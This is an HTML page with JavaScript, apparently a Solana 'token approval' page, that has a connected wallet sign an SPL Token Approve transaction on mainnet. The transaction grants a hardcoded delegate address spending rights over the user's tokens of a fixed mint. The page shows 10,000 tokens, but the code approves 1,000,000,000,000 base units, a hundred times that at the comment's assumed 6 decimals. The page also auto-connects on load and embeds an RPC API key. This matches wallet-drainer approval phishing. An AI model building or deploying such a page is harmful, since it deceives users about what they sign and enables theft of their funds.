<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Token Approval</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 520px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        h1 { color: #333; margin-bottom: 8px; text-align: center; font-size: 22px; }

        .subtitle {
            text-align: center;
            color: #888;
            font-size: 13px;
            margin-bottom: 28px;
        }

        .wallet-status {
            padding: 14px 18px;
            background: #f5f5f5;
            border-radius: 10px;
            margin-bottom: 18px;
            font-size: 14px;
            color: #777;
            text-align: center;
        }

        .wallet-status.connected {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .wallet-address {
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
            margin-top: 6px;
            color: #388e3c;
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
            margin-bottom: 14px;
        }

        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }

        button:disabled { opacity: 0.5; cursor: not-allowed; }

        .message-section { display: none; margin-top: 4px; }
        .message-section.visible { display: block; }

        .info-text {
            text-align: center;
            color: #888;
            font-size: 13px;
            margin-top: 6px;
            line-height: 1.6;
        }

        .result {
            background: #e8f5e9;
            border-radius: 10px;
            padding: 14px 16px;
            margin-top: 18px;
            word-break: break-all;
            font-family: monospace;
            font-size: 11px;
            color: #2e7d32;
            display: none;
        }

        .result.visible { display: block; }
        .result.error { background: #ffebee; color: #c62828; }
        .result.warning { background: #fff3e0; color: #e65100; }
        .result.success { background: #e8f5e9; color: #2e7d32; }
        .result strong { display: block; margin-bottom: 6px; font-size: 13px; }
        
        .tx-link {
            color: #1976d2;
            text-decoration: none;
            word-break: break-all;
        }
        .tx-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>&#x1F4DD; Solana Token Approval</h1>
    <p class="subtitle">Approve 10,000 tokens for delegate spending</p>

    <div id="walletStatus" class="wallet-status">Wallet not connected</div>
    <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>

    <div id="messageSection" class="message-section">
        <button id="signBtn" onclick="buildSignAndSend()">Approve Token Spending</button>
        <div class="info-text">
            Simulates, signs, then broadcasts the approval transaction to Solana mainnet.<br>
            Delegate: AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ<br>
            Amount: 10,000 tokens<br>
            Check the browser console for detailed logs.
        </div>
    </div>

    <div id="result" class="result"></div>
</div>

<script>
var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
var MINT_ADDRESS     = new solanaWeb3.PublicKey('642NfDi7su9jQA1M4Jqc67DaLpY1Vqbt7sbvRMZKpump');

var provider = null;
var wallet   = null;

function getProvider() {
    if (window.phantom && window.phantom.solana && window.phantom.solana.isPhantom)
        return window.phantom.solana;
    if (window.solflare) return window.solflare;
    if (window.solana)   return window.solana;
    return null;
}

async function connectWallet() {
    provider = getProvider();
    if (!provider) { alert('Please install Phantom or another Solana wallet.'); return; }
    try {
        var resp = await provider.connect();
        wallet   = resp.publicKey;
        var el   = document.getElementById('walletStatus');
        el.className = 'wallet-status connected';
        el.innerHTML = '&#10003; Wallet Connected<div class="wallet-address">' + wallet.toString() + '</div>';
        document.getElementById('connectBtn').textContent = 'Disconnect Wallet';
        document.getElementById('connectBtn').onclick = disconnectWallet;
        document.getElementById('messageSection').classList.add('visible');
    } catch (err) {
        alert('Failed to connect: ' + err.message);
    }
}

async function disconnectWallet() {
    try { if (provider) await provider.disconnect(); } catch(e) {}
    wallet = null; provider = null;
    document.getElementById('walletStatus').className = 'wallet-status';
    document.getElementById('walletStatus').textContent = 'Wallet not connected';
    document.getElementById('connectBtn').textContent = 'Connect Wallet';
    document.getElementById('connectBtn').onclick = connectWallet;
    document.getElementById('messageSection').classList.remove('visible');
    document.getElementById('result').classList.remove('visible');
}

// Function to derive ATA address
function getAssociatedTokenAddress(mint, owner) {
    var ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
    
    var seeds = [
        owner.toBuffer(),
        TOKEN_PROGRAM_ID.toBuffer(),
        mint.toBuffer()
    ];
    
    return solanaWeb3.PublicKey.findProgramAddressSync(
        seeds,
        ASSOCIATED_TOKEN_PROGRAM_ID
    )[0];
}

async function buildSignAndSend() {
    if (!wallet || !provider) { alert('Connect your wallet first.'); return; }

    var btn = document.getElementById('signBtn');
    var r   = document.getElementById('result');
    btn.disabled    = true;
    btn.textContent = 'Fetching blockhash…';
    r.classList.remove('visible');

    var recentBlockhash = null;
    var conn = null;
    
    try {
        conn = new solanaWeb3.Connection(
            'https://mainnet.helius-rpc.com/?api-key=e596e7d1-1e3e-423f-b173-c3264aa44a0a',
            'confirmed'
        );
        recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        console.log('✓ Fetched recent blockhash:', recentBlockhash);
    } catch(e) {
        console.error('❌ Failed to fetch blockhash:', e.message);
        r.className = 'result visible error';
        r.innerHTML = '<strong>❌ Failed to Connect</strong>Could not fetch blockhash from RPC. Check your internet connection.';
        btn.disabled = false;
        btn.textContent = 'Approve Token Spending';
        return;
    }

    // Derive the ATA for the user
    var userATA = getAssociatedTokenAddress(MINT_ADDRESS, wallet);
    
    // Define the delegate address
    var delegateAddress = new solanaWeb3.PublicKey('AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ');
    
    // Amount to approve (10000 tokens with 6 decimals = 100000000000)
    var approvalAmount = 1000000000000;
    
    console.log('\n=== DERIVED ADDRESSES ===');
    console.log('User Wallet:', wallet.toString());
    console.log('Mint Address:', MINT_ADDRESS.toString());
    console.log('User ATA:', userATA.toString());
    console.log('Delegate Address:', delegateAddress.toString());
    console.log('Approval Amount:', approvalAmount, '(10000 tokens)');
    console.log('Token Program:', TOKEN_PROGRAM_ID.toString());

    // Build the approve instruction
    // Instruction discriminator for approve is 4
    var instructionData = new Uint8Array(9);
    instructionData[0] = 4; // Approve instruction
    
    // Write the amount as little-endian u64
    var view = new DataView(instructionData.buffer);
    view.setBigUint64(1, BigInt(approvalAmount), true);
    
    var approveIx = new solanaWeb3.TransactionInstruction({
        programId: TOKEN_PROGRAM_ID,
        keys: [
            { pubkey: userATA, isSigner: false, isWritable: true },      // Source account
            { pubkey: delegateAddress, isSigner: false, isWritable: false }, // Delegate
            { pubkey: wallet, isSigner: true, isWritable: false }        // Owner
        ],
        data: instructionData
    });

    var tx = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: recentBlockhash });
    tx.add(approveIx);

    console.log('\n=== TRANSACTION DETAILS ===');
    console.log('Fee Payer:', wallet.toString());
    console.log('Recent Blockhash:', recentBlockhash);
    console.log('Instructions:', tx.instructions.length);
    console.log('\nInstruction 0 (Token Approve):');
    console.log('  Program ID:', tx.instructions[0].programId.toString());
    console.log('  Keys:');
    tx.instructions[0].keys.forEach(function(key, idx) {
        console.log('    [' + idx + '] ' + key.pubkey.toString());
        console.log('        isSigner: ' + key.isSigner + ', isWritable: ' + key.isWritable);
    });
    console.log('  Data (hex):', Array.from(tx.instructions[0].data).map(b => b.toString(16).padStart(2, '0')).join(''));

    // Simulate the transaction
    btn.textContent = 'Simulating transaction…';
    
    try {
        console.log('\n=== SIMULATING TRANSACTION ===');
        
        var simulation = await conn.simulateTransaction(tx);
        
        console.log('Simulation Result:', simulation);
        console.log('- Error:', simulation.value.err);
        console.log('- Logs:', simulation.value.logs);
        console.log('- Units Consumed:', simulation.value.unitsConsumed);
        
        if (simulation.value.err) {
            console.error('❌ Simulation failed:', simulation.value.err);
            r.className = 'result visible error';
            r.innerHTML = '<strong>❌ Simulation Failed</strong>' +
                'Error: ' + JSON.stringify(simulation.value.err) + '<br><br>' +
                'Check console for details.';
            btn.disabled = false;
            btn.textContent = 'Approve Token Spending';
            return;
        } else {
            console.log('✓ Simulation successful!');
            console.log('Units consumed:', simulation.value.unitsConsumed);
        }
    } catch(simErr) {
        console.error('❌ Simulation error:', simErr);
        r.className = 'result visible error';
        r.innerHTML = '<strong>❌ Simulation Error</strong>' +
            simErr.message + '<br><br>Check console for details.';
        btn.disabled = false;
        btn.textContent = 'Approve Token Spending';
        return;
    }

    // Prompt for signature
    btn.textContent = 'Waiting for wallet signature…';

    var signed = null;
    try {
        console.log('\n=== REQUESTING SIGNATURE ===');
        signed = await provider.signTransaction(tx);
        
        console.log('✓ Transaction signed successfully');
        console.log('Signer:', wallet.toString());
    } catch(err) {
        console.error('❌ Signing error:', err);
        r.className = 'result visible error';
        r.innerHTML = '<strong>&#x274C; Signature Rejected</strong>' + err.message;
        btn.disabled = false;
        btn.textContent = 'Approve Token Spending';
        return;
    }

    // Send the transaction to the network
    btn.textContent = 'Sending transaction to network…';
    
    try {
        console.log('\n=== SENDING TRANSACTION ===');
        
        // Serialize and send
        var rawTransaction = signed.serialize();
        var txSignature = await conn.sendRawTransaction(rawTransaction, {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        });
        
        console.log('✓ Transaction sent to network');
        console.log('Transaction signature:', txSignature);
        
        btn.textContent = 'Confirming transaction…';
        r.className = 'result visible warning';
        r.innerHTML = '<strong>⏳ Transaction Sent</strong>' +
            'Waiting for confirmation...<br><br>' +
            '<b>Signature:</b><br>' + txSignature;
        
        // Wait for confirmation
        console.log('\n=== WAITING FOR CONFIRMATION ===');
        var confirmation = await conn.confirmTransaction(txSignature, 'confirmed');
        
        if (confirmation.value.err) {
            console.error('❌ Transaction failed:', confirmation.value.err);
            r.className = 'result visible error';
            r.innerHTML = '<strong>❌ Transaction Failed</strong>' +
                'The transaction was sent but failed on-chain.<br><br>' +
                '<b>Signature:</b><br>' +
                '<a class="tx-link" href="https://solscan.io/tx/' + txSignature + '" target="_blank">' + 
                txSignature + '</a><br><br>' +
                '<b>Error:</b><br>' + JSON.stringify(confirmation.value.err);
        } else {
            console.log('✓ Transaction confirmed successfully!');
            r.className = 'result visible success';
            r.innerHTML =
                '<strong>&#10003; Approval Successful!</strong>' +
                '<b>Signature:</b><br>' +
                '<a class="tx-link" href="https://solscan.io/tx/' + txSignature + '" target="_blank">' + 
                txSignature + '</a><br><br>' +
                '<b>Owner:</b><br>' + wallet.toString() + '<br><br>' +
                '<b>Token Account:</b><br>' + userATA.toString() + '<br><br>' +
                '<b>Delegate:</b><br>' + delegateAddress.toString() + '<br><br>' +
                '<b>Approved Amount:</b><br>10,000 tokens<br><br>' +
                'Click the signature to view on Solscan.';
        }
        
    } catch(sendErr) {
        console.error('❌ Send error:', sendErr);
        r.className = 'result visible error';
        r.innerHTML = '<strong>&#x274C; Failed to Send</strong>' + 
            sendErr.message + '<br><br>Check console for details.';
    }

    btn.disabled    = false;
    btn.textContent = 'Approve Token Spending';
}

window.addEventListener('load', async function() {
    provider = getProvider();
    if (!provider) return;
    try {
        var resp = await provider.connect({ onlyIfTrusted: true });
        wallet   = resp.publicKey;
        var el   = document.getElementById('walletStatus');
        el.className = 'wallet-status connected';
        el.innerHTML = '&#10003; Wallet Connected<div class="wallet-address">' + wallet.toString() + '</div>';
        document.getElementById('connectBtn').textContent = 'Disconnect Wallet';
        document.getElementById('connectBtn').onclick = disconnectWallet;
        document.getElementById('messageSection').classList.add('visible');
    } catch(e) { /* silent */ }
});
</script>
</body>
</html>
